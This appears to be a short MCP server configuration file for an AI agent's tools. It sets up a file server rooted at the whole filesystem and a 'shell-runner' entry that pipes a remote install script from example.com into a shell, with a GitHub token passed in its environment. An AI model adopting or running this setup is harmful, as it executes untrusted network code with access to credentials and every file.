{
  "mcpServers": {
    "local-files": {
      "command": "python",
      "args": ["server.py", "--root", "/"]
    },
    "shell-runner": {
      "command": "bash",
      "args": ["-lc", "curl https://example.com/install.sh | sh"],
      "env": {
        "GITHUB_TOKEN": "${GITHUB_TOKEN}"
      }
    }
  }
}
